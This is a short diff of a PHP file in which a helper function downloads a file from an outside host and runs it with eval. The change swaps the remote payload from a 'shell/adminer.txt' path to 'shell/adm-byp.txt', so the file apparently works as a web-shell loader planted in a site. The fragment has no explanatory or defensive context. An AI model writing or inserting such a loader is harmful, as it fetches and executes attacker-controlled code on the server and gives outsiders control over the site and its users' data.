@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://marslogs.co.id/shell/shell/adminer.txt');
+$a = geturlsinfo('https://marslogs.co.id/shell/shell/adm-byp.txt');
 eval    ('?>'.$a);
